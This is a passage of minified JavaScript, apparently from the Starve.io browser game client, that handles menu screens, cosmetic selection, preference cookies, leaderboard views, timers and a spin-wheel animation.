            n_.cosmetic_author = ts("by " + i.author, 0, "#EFE4B4", 30, 250, undefined, 10, 8);
          }
        }
        function d() {
          if (E !== this.cosmeticId && this.cosmeticId !== -1) {
            if (this.unlocked > 0) {
              if (i === FIRST_BUTTON_SKIN) {
                Y(g, $, "none");
              } else {
                Y(C, $, "none");
              }
            } else if (i === FIRST_BUTTON_SKIN) {
              Y(g, ee, "inline-block");
            } else {
              Y(C, ee, "inline-block");
            }
            E = this.cosmeticId;
            r(this.cosmeticId);
            A();
          }
        }
        this.initSelector = function () {
          for (var r = i, n = _ * 3; r < s && n < e.length; r++, n++) {
            if (e[n].rarity !== RARITY.SPECIAL || a[n] !== 0) {
              t.buttons[r].info.cosmeticId = n;
              for (var o = 0; o < 3; o++) {
                t.buttons[r].info.img[o] = RARITY_BUTTON[e[n].rarity][o];
                t.buttons[r].info.active = ee;
                t.buttons[r].info.unlocked = a[n];
              }
            } else {
              t.buttons[r].info.cosmeticId = -1;
              t.buttons[r].info.active = $;
            }
          }
          for (; r < s; r++) {
            t.buttons[r].info.cosmeticId = -1;
            t.buttons[r].info.active = $;
          }
          A();
        };
        t.buttons[s].info.callback = function () {
          if (_ > 0) {
            _--;
          }
          o.initSelector();
        };
        t.buttons[s + 1].info.callback = function () {
          if (_ * 3 + 9 < e.length) {
            _++;
          }
          o.initSelector();
        };
      }
      function n() {
        var e = Number(Cookies.get("starve_crate"));
        var i = Number(Cookies.get("starve_dead"));
        var r = Number(Cookies.get("starve_book"));
        var n = Number(Cookies.get("starve_bag"));
        var a = Number(Cookies.get("starve_skin"));
        var o = Number(Cookies.get("starve_accessory"));
        t.skin = a || 0;
        t.book = r || 0;
        t.crate = e || 1;
        t.accessory = o || 0;
        t.bag = n || 0;
        t.dead = i || 0;
      }
      function a() {
        for (var e = COSMETICS.SKIN, i = 0; i < e.length; i++) {
          if (e[i].rarity === RARITY.FREE) {
            t.unlock.skin[i] = 1;
          } else {
            t.unlock.skin[i] = 0;
          }
        }
        e = COSMETICS.ACCESSORY;
        i = 0;
        for (; i < e.length; i++) {
          if (e[i].rarity === RARITY.FREE) {
            t.unlock.accessory[i] = 1;
          } else {
            t.unlock.accessory[i] = 0;
          }
        }
        e = COSMETICS.BAG;
        i = 0;
        for (; i < e.length; i++) {
          if (e[i].rarity === RARITY.FREE) {
            t.unlock.bag[i] = 1;
          } else {
            t.unlock.bag[i] = 0;
          }
        }
        e = COSMETICS.BOOK;
        i = 0;
        for (; i < e.length; i++) {
          if (e[i].rarity === RARITY.FREE) {
            t.unlock.book[i] = 1;
          } else {
            t.unlock.book[i] = 0;
          }
        }
        e = COSMETICS.CRATE;
        i = 0;
        for (; i < e.length; i++) {
          if (e[i].rarity === RARITY.FREE) {
            t.unlock.crate[i] = 1;
            t.unlock.dead[i] = 1;
          } else {
            t.unlock.crate[i] = 0;
            t.unlock.dead[i] = 0;
          }
        }
      }
      this.waiting = false;
      this.in_this_view = 0;
      this.current_mode_score = -1;
      this.loading = {
        translate: {
          x: 0,
          y: 0
        },
        angle: 0,
        img: sprite[Ie.GEAR2],
        draw: function () {
          this.angle += I_ * 2;
          i.save();
          i.translate(this.translate.x + this.img.width / 2, this.translate.y + this.img.height / 2);
          i.rotate(this.angle);
          Nn(i, this.img, -this.img.width / 2, -this.img.height / 2);
          i.restore();
        }
      };
      this.langselect = {
        id: document.getElementById("langselect"),
        style: document.getElementById("langselect").style,
        translate: {
          x: 0,
          y: 0
        },
        update: function () {
          this.style.left = Math.floor(this.translate.x) + "px";
          this.style.top = Math.floor(this.translate.y) + "px";
        }
      };
      this.bread = 0;
      this.previous_bread = -1;
      this.bread_img = undefined;
      this.new_nickname = "";
      this.previous_new_nickname = "";
      this.new_nickname_img = undefined;
      this.lvl = 0;
      this.previous_lvl = -1;
      this.lvl_img = undefined;
      this.xp = 0;
      this.xp_dest = 0;
      this.firstName = 0;
      this.kill = 0;
      this.death = 0;
      this.time = 0;
      this.score = 0;
      this.scoreTotal = 0;
      this.bestKill = 0;
      this.bestTime = 0;
      this.bestScore = 0;
      this.seasons = [];
      this.kit = -1;
      this.previous_kit_hour = -1;
      this.previous_kit_min = -1;
      this.kit_img_min = undefined;
      this.kit_img_hour = undefined;
      this.privateServerTime = -1;
      this.previous_privateServerTime_day = -1;
      this.previous_privateServerTime_hour = -1;
      this.previous_privateServerTime_min = -1;
      this.privateServerTime_img_min = undefined;
      this.privateServerTime_img_hour = undefined;
      this.privateServerTime_img_day = undefined;
      this.cosmetic_name = undefined;
      this.cosmetic_author = undefined;
      this.leaderboard_range = undefined;
      this.leaderboard_mode = undefined;
      this.leaderboard_sorted = undefined;
      this.leaderboard_season = undefined;
      this.profile_season = 4;
      this.breath = 0;
      this.settings = false;
      this.quality = Cookies.get("starve_quality") ? Cookies.get("starve_quality") : "high";
      if (this.quality === "high") {
        document.getElementById("high_ing").style.backgroundColor = "#B56D18";
        document.getElementById("low_ing").style.backgroundColor = "#3A2A0D";
        this.quality = 1;
      } else {
        document.getElementById("low_ing").style.backgroundColor = "#B56D18";
        document.getElementById("high_ing").style.backgroundColor = "#3A2A0D";
        this.quality = 0;
      }
      this.high_quality = function () {
        document.getElementById("high_ing").style.backgroundColor = "#B56D18";
        document.getElementById("low_ing").style.backgroundColor = "#3A2A0D";
        Cookies.set("starve_quality", "high", {
          expires: 30
        });
        document.getElementById("input_ratio").value = 1;
        T_.change_ratio();
        n_.quality = 1;
      };
      this.low_quality = function () {
        document.getElementById("high_ing").style.backgroundColor = "#3A2A0D";
        document.getElementById("low_ing").style.backgroundColor = "#B56D18";
        Cookies.set("starve_quality", "low", {
          expires: 30
        });
        document.getElementById("input_ratio").value = 0.5 / (re / ne);
        T_.change_ratio();
        n_.quality = 0;
      };
      if (Cookies.get("starve_mapping") === undefined && se === "FR") {
        d_.set_azerty();
        this.mapping = "azerty";
      } else {
        this.mapping = Cookies.get("starve_mapping") ? Cookies.get("starve_mapping") : "qwerty";
      }
      if (this.mapping == "azerty") {
        d_.set_azerty();
        document.getElementById("azerty_ing").style.backgroundColor = "#B56D18";
        document.getElementById("qwerty_ing").style.backgroundColor = "#3A2A0D";
      } else {
        document.getElementById("qwerty_ing").style.backgroundColor = "#B56D18";
        document.getElementById("azerty_ing").style.backgroundColor = "#3A2A0D";
      }
      this.set_azerty = function () {
        d_.set_azerty();
        document.getElementById("azerty_ing").style.backgroundColor = "#B56D18";
        document.getElementById("qwerty_ing").style.backgroundColor = "#3A2A0D";
        Cookies.set("starve_mapping", "azerty", {
          expires: 30
        });
      };
      this.set_qwerty = function () {
        d_.set_qwerty();
        document.getElementById("azerty_ing").style.backgroundColor = "#3A2A0D";
        document.getElementById("qwerty_ing").style.backgroundColor = "#B56D18";
        Cookies.set("starve_mapping", "qwerty", {
          expires: 30
        });
      };
      this.all_rights_reserved = {
        id: document.getElementById("all_rights_reserved"),
        style: document.getElementById("all_rights_reserved").style,
        translate: {
          x: 0,
          y: 0
        },
        update: function () {
          this.style.left = this.translate.x + "px";
          this.style.top = Math.floor(this.translate.y) + "px";
        }
      };
      n();
      this.unlock = {};
      this.unlock.skin = [];
      this.unlock.bag = [];
      this.unlock.book = [];
      this.unlock.crate = [];
      this.unlock.dead = [];
      this.unlock.accessory = [];
      this.day_mode = 0;
      this.unlock_cosmetics = a;
      a();
      var o;
      var s = 0;
      var _ = function () {
        t.update();
        if (++s == 30) {
          t.add_event_listener();
          t.in_this_view = true;
          return void t.update();
        }
        window.setTimeout(_, 33);
      };
      this.quit = function (e) {
        o = e;
        t.remove_event_listener();
        t.in_this_view = 0;
        E = -1;
        T();
      };
      var E = -1;
      var T = function () {
        t.update();
        if (++E == 30) {
          Cookies.set("starve_nickname", t.nickname.input.value, {
            expires: 30
          });
          t.nickname.style.display = "none";
          t.server_list.style.display = "none";
          t.langselect.style.display = "none";
          t.all_rights_reserved.style.display = "none";
          t.stop();
          return void o();
        }
        window.setTimeout(T, 33);
      };
      this.is_run = false;
      this.stop = function () {
        this.is_run = false;
      };
      this.run = function () {
        document.getElementById("game_body").style.backgroundColor = Ie.GROUND[o_.time];
        t.nickname.style.display = "inline-block";
        t.server_list.style.display = "inline-block";
        t.langselect.style.display = "inline-block";
        t.all_rights_reserved.style.display = "inline-block";
        t.waiting = false;
        t.is_run = true;
        E = -1;
        s = 0;
        _();
      };
      this.update_component = function (e, i) {
        i = i < 0 ? -i : i;
        if ((e.position & Z) === Z) {
          if ((e.position & J) === J) {
            e.translate.x = m + e.translate._x - i;
          } else if ((e.position & X) === X) {
            e.translate.x = m + e.translate._x + i;
          } else {
            e.translate.x = m + e.translate._x;
          }
        } else if ((e.position & J) === J) {
          e.translate.x = e.translate._x - i;
        } else if ((e.position & X) === X) {
          e.translate.x = S - e.translate._x + i;
        } else {
          e.translate.x = e.translate._x;
        }
        if ((e.position & Q) === Q) {
          if ((e.position & q) === q) {
            e.translate.y = v + e.translate._y - i;
          } else if ((e.position & j) === j) {
            e.translate.y = v + e.translate._y + i;
          } else {
            e.translate.y = v + e.translate._y;
          }
        } else if ((e.position & q) === q) {
          e.translate.y = e.translate._y - i;
        } else if ((e.position & j) === j) {
          e.translate.y = p + e.translate._y + i;
        } else {
          e.translate.y = e.translate._y;
        }
        if (e.style !== undefined) {
          e.style.left = Math.floor(e.translate.x) + "px";
          e.style.top = Math.floor(e.translate.y) + "px";
        }
      };
      this.update = function () {
        var e = 0;
        if (s != 30 || E != -1) {
          if (s != 30) {
            e = 1500 / (s + 1) - 50;
          }
          if (E != -1) {
            e = -(1750 / (30 - E + 1) - 48);
          }
        }
        for (var i = 0; i < this.bkgd.length; i++) {
          this.update_component(this.bkgd[i], e);
        }
        for (i = 0; i < this.buttons.length; i++) {
          this.update_component(this.buttons[i].info, e);
        }
        for (i = 0; i < this.css.length; i++) {
          this.update_component(this.css[i], e);
        }
        this.loading.translate.x = (S - this.loading.img.width) / 2;
        this.loading.translate.y = 0;
        this.langselect.translate.x = S - 450;
        this.langselect.translate.y = p - 40;
        this.all_rights_reserved.translate.x = S - 340;
        this.all_rights_reserved.translate.y = p - 25;
        if (s != 30 || E != -1) {
          var t = 0;
          if (s != 30) {
            t = 1500 / (s + 1) - 50;
          }
          if (E != -1) {
            t = -(1750 / (30 - E + 1) - 48);
          }
          this.loading.translate.y -= t > 0 ? t : -t;
          this.langselect.translate.y -= t < 0 ? t : -t;
          this.all_rights_reserved.translate.y -= t < 0 ? t : -t;
        }
        this.langselect.update();
        this.all_rights_reserved.update();
      };
      this.create_spin = function (e) {
        var i = document.createElement("canvas");
        var t = i.getContext("2d");
        i.width = 342;
        i.height = 342;
        for (var r = -Math.PI / 2, n = 0; n < e.length; n++) {
          var a = e[n][0];
          var o = e[n][1] * Math.PI / 180;
          t.beginPath();
          t.arc(171, 171, 170, r, r + o, false);
          t.lineTo(171, 171);
          t.fillStyle = a;
          t.fill();
          r += o;
        }
        return i;
      };
      this.generate_new_nickname = function () {
        this.new_nickname = document.getElementById("account_nickname_input").value;
        if (this.new_nickname !== this.previous_new_nickname) {
          this.previous_new_nickname = this.new_nickname;
          this.new_nickname_img = ts(this.new_nickname, 0, "#EFE4B4", 45, 550);
        }
      };
      this.draw = function () {
        Cn();
        n_.xp = Utils.lerp(n_.xp, n_.xp_dest, 0.03);
        this.bkgd[LEVEL_GAUGE].translate.x = this.bkgd[0].translate.x + -72 + n_.xp * 165;
        this.bkgd[LEVEL_GAUGE].translate._x = this.bkgd[LEVEL_GAUGE].translate.x;
        this.bkgd[LEVEL_GAUGE].translate.y = this.bkgd[0].translate.y + 30;
        this.bkgd[LEVEL_GAUGE].translate._y = this.bkgd[LEVEL_GAUGE].translate.y;
        for (var e = 2; e < this.bkgd.length; e++) {
          if (this.bkgd[e].active === ee) {
            this.bkgd[e].draw(i);
          }
        }
        var r;
        if ((r = this.kit - Date.now()) > 0) {
          var n = Math.floor(r / 60000);
          var a = Math.floor(n / 60);
          if ((n %= 60) !== this.previous_kit_min) {
            this.previous_kit_min = n;
            n = n < 10 ? "0" + n : "" + n;
            t.kit_img_min = ts(n, 0, "#EFE4B4", 80, 200);
          }
          if (a !== this.previous_kit_hour) {
            this.previous_kit_hour = a;
            a = a < 10 ? "0" + a : "" + a;
            t.kit_img_hour = ts(a, 0, "#EFE4B4", 80, 200);
          }
          (s = this.bkgd[BAG_REMAIN_BOX]).draw(i);
          var o = this.kit_img_hour;
          Nn(i, o, s.translate.x - o.width / 4 + 182, s.translate.y - o.height / 4 + 40, o.width / 2, o.height / 2);
          o = this.kit_img_min;
          Nn(i, o, s.translate.x - o.width / 4 + 251, s.translate.y - o.height / 4 + 40, o.width / 2, o.height / 2);
        }
        if ((r = this.privateServerTime - Date.now()) > 0) {
          n = Math.floor(r / 60000);
          a = Math.floor(n / 60);
          var s;
          var _ = Math.floor(a / 24);
          a %= 24;
          if ((n %= 60) !== this.previous_privateServerTime_min) {
            this.previous_privateServerTime_min = n;
            n = n < 10 ? "0" + n : "" + n;
            t.privateServerTime_img_min = ts(n, 0, "#EFE4B4", 80, 200);
          }
          if (a !== this.previous_privateServerTime_hour) {
            this.previous_privateServerTime_hour = a;
            a = a < 10 ? "0" + a : "" + a;
            t.privateServerTime_img_hour = ts(a, 0, "#EFE4B4", 80, 200);
          }
          if (_ !== this.previous_privateServerTime_day) {
            this.previous_privateServerTime_day = _;
            _ = _ < 10 ? "0" + _ : "" + _;
            t.privateServerTime_img_day = ts(_, 0, "#EFE4B4", 80, 200);
          }
          (s = this.bkgd[SERVER_REMAIN_BOX]).draw(i);
          o = this.privateServerTime_img_day;
          Nn(i, o, s.translate.x - o.width / 4 + 113, s.translate.y - o.height / 4 + 40, o.width / 2, o.height / 2);
          o = this.privateServerTime_img_hour;
          Nn(i, o, s.translate.x - o.width / 4 + 182, s.translate.y - o.height / 4 + 40, o.width / 2, o.height / 2);
          o = this.privateServerTime_img_min;
          Nn(i, o, s.translate.x - o.width / 4 + 251, s.translate.y - o.height / 4 + 40, o.width / 2, o.height / 2);
        }
        if ((this.current_view & d) === d) {
          this.buttons[GAME_BUTTON].info.state = es;
        } else if ((this.current_view & c) === c) {
          this.buttons[LEADERBOARD_BUTTON].info.state = es;
        } else if ((this.current_view & u) === u) {
          this.buttons[COSMETICS_BUTTON].info.state = es;
        } else if ((this.current_view & h) === h) {
          this.buttons[PROFILE_BUTTON].info.state = es;
        } else if ((this.current_view & O) === O) {
          this.buttons[TUTORIAL_BUTTON].info.state = es;
        } else if ((this.current_view & I) === I) {
          this.buttons[LOGIN_BUTTON].info.state = es;
        } else if ((this.current_view & l) === l || (this.current_view & N) === N || (this.current_view & b) === b || (this.current_view & D) === D || (this.current_view & M) === M || (this.current_view & L) === L || (this.current_view & G) === G) {
          this.buttons[SHOP_BUTTON].info.state = es;
        } else if ((this.current_view & f) === f || (this.current_view & P) === P || (this.current_view & H) === H || (this.current_view & y) === y || (this.current_view & B) === B || (this.current_view & z) === z) {
          this.buttons[COSMETICS_BUTTON].info.state = es;
        } else if ((this.current_view & w) === w || (this.current_view & K) === K || (this.current_view & U) === U) {
          this.buttons[SERVER_BUTTON].info.state = es;
        }
        if ((this.current_view & c) === c) {
          if (this.leaderboard_mode === this.LEADERBOARD_TOTAL) {
            this.leaderboard_range = this.LEADERBOARD_ALL;
            this.buttons[this.LEADERBOARD_ALL].info.active = $;
            this.buttons[this.LEADERBOARD_WEEK].info.active = $;
            this.buttons[this.LEADERBOARD_TODAY].info.active = $;
          } else {
            this.buttons[this.LEADERBOARD_ALL].info.active = ee;
            this.buttons[this.LEADERBOARD_WEEK].info.active = ee;
            this.buttons[this.LEADERBOARD_TODAY].info.active = ee;
          }
          if (this.leaderboard_mode === this.LEADERBOARD_NORMAL) {
            this.buttons[this.LEADERBOARD_NORMAL].info.state = es;
          } else if (this.leaderboard_mode === this.LEADERBOARD_VAMPIRE) {
            this.buttons[this.LEADERBOARD_VAMPIRE].info.state = es;
          } else if (this.leaderboard_mode === this.LEADERBOARD_TOTAL) {
            this.buttons[this.LEADERBOARD_TOTAL].info.state = es;
          } else if (this.leaderboard_mode === this.LEADERBOARD_ZOMBIE) {
            this.buttons[this.LEADERBOARD_ZOMBIE].info.state = es;
          } else if (this.leaderboard_mode === this.LEADERBOARD_FOREST) {
            this.buttons[this.LEADERBOARD_FOREST].info.state = es;
          }
          if (this.leaderboard_range === this.LEADERBOARD_ALL) {
            this.buttons[this.LEADERBOARD_ALL].info.state = es;
          } else if (this.leaderboard_range === this.LEADERBOARD_WEEK) {
            this.buttons[this.LEADERBOARD_WEEK].info.state = es;
          } else if (this.leaderboard_range === this.LEADERBOARD_TODAY) {
            this.buttons[this.LEADERBOARD_TODAY].info.state = es;
          }
          if (this.leaderboard_sorted === this.LEADERBOARD_KILL) {
            this.buttons[this.LEADERBOARD_KILL].info.state = es;
          } else if (this.leaderboard_sorted === this.LEADERBOARD_SCORE) {
            this.buttons[this.LEADERBOARD_SCORE].info.state = es;
          } else if (this.leaderboard_sorted === this.LEADERBOARD_TIME) {
            this.buttons[this.LEADERBOARD_TIME].info.state = es;
          }
          if (this.leaderboard_season === this.LEADERBOARD_SEASON1) {
            this.buttons[this.LEADERBOARD_SEASON1].info.state = es;
          } else if (this.leaderboard_season === this.LEADERBOARD_SEASON2) {
            this.buttons[this.LEADERBOARD_SEASON2].info.state = es;
          } else if (this.leaderboard_season === this.LEADERBOARD_SEASON3) {
            this.buttons[this.LEADERBOARD_SEASON3].info.state = es;
          } else if (this.leaderboard_season === this.LEADERBOARD_SEASON4) {
            this.buttons[this.LEADERBOARD_SEASON4].info.state = es;
          } else if (this.leaderboard_season === this.LEADERBOARD_SEASON5) {
            this.buttons[this.LEADERBOARD_SEASON5].info.state = es;
          }
        }
        if ((this.current_view & h) === h) {
          if (this.current_mode_score === -1) {
            this.buttons[ge].info.state = es;
          } else if (this.current_mode_score === ds.MODE_PVP) {
            this.buttons[Ce].info.state = es;
          } else if (this.current_mode_score === ds.MODE_ZOMBIES) {
            this.buttons[be].info.state = es;
          } else if (this.current_mode_score === ds.MODE_VAMPIRES) {
            this.buttons[De].info.state = es;
          } else if (this.current_mode_score === ds.MODE_LEGACY) {
            this.buttons[Ne].info.state = es;
          }
          if (this.profile_season === 0) {
            this.buttons[ue].info.state = es;
          } else if (this.profile_season === 1) {
            this.buttons[le].info.state = es;
          } else if (this.profile_season === 2) {
            this.buttons[Oe].info.state = es;
          } else if (this.profile_season === 3) {
            this.buttons[ce].info.state = es;
          } else if (this.profile_season === 4) {
            this.buttons[Re].info.state = es;
          }
        }
        if ((this.current_view & d) === d && client.privateServer === 0) {
          if (this.buttons[oe].in_button(h_.pos)) {
            this.buttons[oe].hint = Math.min(1, this.buttons[oe].hint + I_ * 1.5);
          } else {
            this.buttons[oe].hint = Math.max(0, this.buttons[oe].hint - I_ * 1.5);
          }
          if (this.buttons[_e].in_button(h_.pos)) {
            this.buttons[_e].hint = Math.min(1, this.buttons[_e].hint + I_ * 1.5);
          } else {
            this.buttons[_e].hint = Math.max(0, this.buttons[_e].hint - I_ * 1.5);
          }
          if (this.buttons[Ee].in_button(h_.pos)) {
            this.buttons[Ee].hint = Math.min(1, this.buttons[Ee].hint + I_ * 1.5);
          } else {
            this.buttons[Ee].hint = Math.max(0, this.buttons[Ee].hint - I_ * 1.5);
          }
          if (this.buttons[de].in_button(h_.pos)) {
            this.buttons[de].hint = Math.min(1, this.buttons[de].hint + I_ * 1.5);
          } else {
            this.buttons[de].hint = Math.max(0, this.buttons[de].hint - I_ * 1.5);
          }
          if (this.buttons[Te].in_button(h_.pos)) {
            this.buttons[Te].hint = Math.min(1, this.buttons[Te].hint + I_ * 1.5);
          } else {
            this.buttons[Te].hint = Math.max(0, this.buttons[Te].hint - I_ * 1.5);
          }
          if (this.buttons[Ae].in_button(h_.pos)) {
            this.buttons[Ae].hint = Math.min(1, this.buttons[Ae].hint + I_ * 1.5);
          } else {
            this.buttons[Ae].hint = Math.max(0, this.buttons[Ae].hint - I_ * 1.5);
          }
        }
        var E = 1;
        if ((this.current_view & (N | b | D | M | L | G)) > 1) {
          o = IMAGES.ARROW_SPIN;
          i.save();
          i.translate(m, ae + o.height / 4);
          if (this.spin === 1) {
            this.spin_effect += I_ / 3;
            E = this.spin_target - 100 / Math.pow(1 + this.spin_effect, 1 + this.spin_effect);
            i.rotate(E);
          }
          Nn(i, o, -o.width / 4, -o.height / 4, o.width / 2, o.height / 2);
          i.restore();
        }
        if (client.privateServer === 0) {
          if (client.current_mode === ds.MODE_PVP) {
            this.buttons[oe].info.state = es;
          } else if (client.current_mode === ds.MODE_LEGACY) {
            this.buttons[_e].info.state = es;
          } else if (client.current_mode === ds.MODE_ZOMBIES) {
            this.buttons[Te].info.state = es;
          } else if (client.current_mode === ds.MODE_VAMPIRES) {
            this.buttons[Ae].info.state = es;
          } else if (client.current_mode === ds.MODE_COMMUNITY) {
            this.buttons[Ee].info.state = es;
          } else if (client.current_mode === ds.MODE_EXPERIMENTAL) {
            this.buttons[de].info.state = es;
          }
        }
        for (e = 1; e < this.buttons.length; e++) {
          if (this.buttons[e].info.active === ee) {
            this.buttons[e].draw(i);
          }
        }
        this.bkgd[0].draw(i);
        if ((this.current_view & (V | W)) > 0) {
          o = this.new_nickname_img;
          Nn(i, o, m - o.width / 4, 138, o.width / 2, o.height / 2);
        }
        var T = Math.max(1, Math.min(18, Math.floor((n_.lvl + 3) / 2)));
        this.bkgd[T].active = ee;
        this.bkgd[T].draw(i);
        this.bkgd[T].active = $;
        this.buttons[0].draw(i);
        if ((this.current_view & (u | P | y | f | B)) > 1) {
          var A = (this.current_view & (P | y | f | B)) > 1 ? -190 : 0;
          o = sprite[Ie.BAG][this.bag][this.day_mode];
          Nn(i, o, m - o.width / 4 + A, 183, o.width / 2, o.height / 2);
          this.breath = (this.breath + I_ * 1000) % 2000;
          var R = (this.breath < 1000) * 4.5 ? this.breath / 1000 : (2000 - this.breath) / 1000;
          o = sprite[Ie.BOOK][this.book][this.day_mode];
          Nn(i, o, m - o.width / 4 - 62 + R + A, 240, o.width / 2, o.height / 2);
          o = sprite[Ie.HAND][this.skin][this.day_mode];
          Nn(i, o, m - o.width / 4 - 54 + R + A, 272, o.width / 2, o.height / 2);
          Nn(i, o, m - o.width / 4 + 54 - R + A, 272, o.width / 2, o.height / 2);
          o = sprite[Ie.BODY][this.skin][this.day_mode];
          Nn(i, o, m - o.width / 4 + A, 222, o.width / 2, o.height / 2);
          o = sprite[Ie.ACCESSORY][this.accessory][this.day_mode];
          Nn(i, o, m - o.width / 4 + A, 222, o.width / 2, o.height / 2);
        }
        if ((this.current_view & u) === u) {
          o = sprite[Ie.CRATE][this.crate][this.day_mode];
          Nn(i, o, m - o.width / 4 - 61, 406 - o.height / 4, o.width / 2, o.height / 2);
          o = sprite[Ie.CRATE][this.dead][this.day_mode];
          Nn(i, o, m - o.width / 4 + 53, 406 - o.height / 4, o.width / 2, o.height / 2);
        }
        if ((this.current_view & H) === H) {
          o = sprite[Ie.CRATE][this.dead][this.day_mode];
          Nn(i, o, m - o.width / 4 - 200, 268 - o.height / 4, o.width / 2, o.height / 2);
        }
        if ((this.current_view & z) === z) {
          o = sprite[Ie.CRATE][this.crate][this.day_mode];
          Nn(i, o, m - o.width / 4 - 200, 268 - o.height / 4, o.width / 2, o.height / 2);
        }
        if ((this.current_view & (P | y | f | B | H | z)) > 1) {
          for (e = 1; e < this.buttons.length; e++) {
            if ((this.buttons[e].view & this.current_view) != 0) {
              var g = this.buttons[e].info;
              if (g.cosmeticId >= 0) {
                o = g.cosmeticType[g.cosmeticId].day;
                Nn(i, o, g.translate.x - o.width / 8 + 44.5, g.translate.y - o.height / 8 + 45.5, o.width / 4, o.height / 4);
                if (g.unlocked !== 1) {
                  o = IMAGES.RED_LOCKED;
                  Nn(i, o, g.translate.x - o.width / 4 + 44.5, g.translate.y - o.height / 4 + 44.5, o.width / 2, o.height / 2);
                }
              }
            }
          }
          o = this.cosmetic_name;
          Nn(i, o, m - 312, 375, o.width / 2, o.height / 2);
          o = this.cosmetic_author;
          Nn(i, o, m - 312, 395, o.width / 2, o.height / 2);
        }
        if (this.bread !== this.previous_bread) {
          this.previous_bread = this.bread;
          this.bread_img = ts("" + this.bread, 0, "#EFE4B4", 60, 250);
        }
        Nn(i, this.bread_img, this.bkgd[0].translate.x + 350, 15, this.bread_img.w2, this.bread_img.h2);
        if (this.lvl !== this.previous_lvl) {
          this.previous_lvl = this.lvl;
          this.lvl_img = ts("LVL " + (this.lvl + 1), 0, "#EFE4B4", 50, 250, undefined, 30, 24, undefined, undefined, undefined, undefined, "#3F3019", 20);
        }
        Nn(i, this.lvl_img, this.bkgd[0].translate.x + 94, 0, this.lvl_img.w2, this.lvl_img.h2);
        if (client.privateServer === 0) {
          var C;
          if ((C = this.buttons[oe].hint) > 0) {
            o = IMAGES.NORMAL_MODE_HOVER;
            Nn(i, o, m - o.width / 4, -36 - o.height * Utils.ease_in_out_quad(1 - C) / 2, o.width / 2, o.height / 2);
          }
          if ((C = this.buttons[_e].hint) > 0) {
            o = IMAGES.FOREST_MODE_HOVER;
            Nn(i, o, m - o.width / 4, -36 - o.height * Utils.ease_in_out_quad(1 - C) / 2, o.width / 2, o.height / 2);
          }
          if ((C = this.buttons[Ee].hint) > 0) {
            o = IMAGES.MODE_COMMUNITY_HOVER;
            Nn(i, o, m - o.width / 4, -36 - o.height * Utils.ease_in_out_quad(1 - C) / 2, o.width / 2, o.height / 2);
          }
          if ((C = this.buttons[de].hint) > 0) {
            o = IMAGES.MODE_EXPERIMENTAL_HOVER;
            Nn(i, o, m - o.width / 4, -36 - o.height * Utils.ease_in_out_quad(1 - C) / 2, o.width / 2, o.height / 2);
          }
          if ((C = this.buttons[Ae].hint) > 0) {
            o = IMAGES.VAMPIRE_MODE_HOVER;
            Nn(i, o, m - o.width / 4, -36 - o.height * Utils.ease_in_out_quad(1 - C) / 2, o.width / 2, o.height / 2);
          }
          if ((C = this.buttons[Te].hint) > 0) {
            o = IMAGES.ZOMBIE_MODE_HOVER;
            Nn(i, o, m - o.width / 4, -36 - o.height * Utils.ease_in_out_quad(1 - C) / 2, o.width / 2, o.height / 2);
          }
        }
        if (this.spin === 1 && Math.abs(E - this.spin_target) < 0.006) {
          i.globalAlpha = Math.min(1, this.spin_win_effect * 3);
          o = IMAGES.SPIN_LIGHT;
          i.save();
          i.translate(m, 260);
          this.spin_win_effect += I_;
          i.rotate(this.spin_win_effect);
          Nn(i, o, -o.width / 2, -o.height / 2, o.width, o.height);
          i.restore();
          R = 1.05 + Math.sin(this.spin_win_effect * 5) * 0.05;
          if (this.spin_type === 0) {
            var S = R * (o = COSMETICS.SKIN[this.spin_win].day).width;
            var p = R * o.height;
            Nn(i, o, m - S / 2, 260 - p / 2, S, p);
          } else if (this.spin_type === 1) {
            S = R * (o = COSMETICS.SKIN[0].day).width;
            p = R * o.height;
            Nn(i, o, m - S / 2, 260 - p / 2, S, p);
            S = R * (o = COSMETICS.ACCESSORY[this.spin_win].day).width;
            p = R * o.height;
            Nn(i, o, m - S / 2, 260 - p / 2, S, p);
          } else if (this.spin_type === 2) {
            S = R * (o = COSMETICS.BAG[this.spin_win].day).width;
            p = R * o.height;
            Nn(i, o, m - S / 2, 180 - p / 2, S, p);
            S = R * (o = COSMETICS.SKIN[0].day).width;
            p = R * o.height;
            Nn(i, o, m - S / 2, 260 - p / 2, S, p);
          } else if (this.spin_type === 3) {
            S = R * (o = COSMETICS.BOOK[this.spin_win].day).width;
            p = R * o.height;
            i.save();
            i.translate(m, 260);
            i.rotate(Math.PI);
            Nn(i, o, -S / 2, -p / 2, S, p);
            i.restore();
          } else if (this.spin_type === 4) {
            S = R * (o = COSMETICS.CRATE[this.spin_win].day).width;
            p = R * o.height;
            Nn(i, o, m - S / 2, 260 - p / 2, S, p);
          }
          o = this.spin_name;
          Nn(i, o, m - o.width / 4, 340, o.width / 2, o.height / 2);
          o = this.spin_author;
          Nn(i, o, m - o.width / 4, 365, o.width / 2, o.height / 2);
          if (this.spin_win_effect > 6) {
            this.spin = 0;
            F(l);
          }
          i.globalAlpha = 1;
        }
        __.alert.draw("#FFF", "#000");
        if (t.waiting) {
          this.loading.draw();
        }
      };
      var A = 0;
      var d = Math.pow(2, A++);
      var h = Math.pow(2, A++);
      this.__PROFILE__ = h;
      var I = Math.pow(2, A++);
      var u = Math.pow(2, A++);
      var l = Math.pow(2, A++);
      var O = Math.pow(2, A++);
      var c = Math.pow(2, A++);
      var R = Math.pow(2, A++);
      this.__BUY__ = R;
      var g = Math.pow(2, A++);
      var C = Math.pow(2, A++);
      var N = Math.pow(2, A++);
      var b = Math.pow(2, A++);
      var D = Math.pow(2, A++);
      var M = Math.pow(2, A++);
      var L = Math.pow(2, A++);
      var G = Math.pow(2, A++);
      var f = Math.pow(2, A++);
      var H = Math.pow(2, A++);
      var P = Math.pow(2, A++);
      var y = Math.pow(2, A++);
      var B = Math.pow(2, A++);
      var z = Math.pow(2, A++);
      var W = Math.pow(2, A++);
      var V = Math.pow(2, A++);
      var w = Math.pow(2, A++);
      this.__SERVER_LOCATION__ = w;
      var K = Math.pow(2, A++);
      this.__SERVER_DURATION__ = K;
      var U = Math.pow(2, A++);
      function Y(e, i, r) {
        for (var n = 0; n < t.bkgd.length; n++) {
          if ((t.bkgd[n].view & e) != 0) {
            t.bkgd[n].active = i;
          }
        }
        for (n = 0; n < t.buttons.length; n++) {
          if ((t.buttons[n].view & e) != 0) {
            t.buttons[n].info.active = i;
          }
        }
        for (n = 0; n < t.css.length; n++) {
          if ((t.css[n].view & e) != 0) {
            t.css[n].style.display = r;
          }
        }
      }
      this.__SERVER_ACCESS__ = U;
      this.current_view = d;
      function k() {
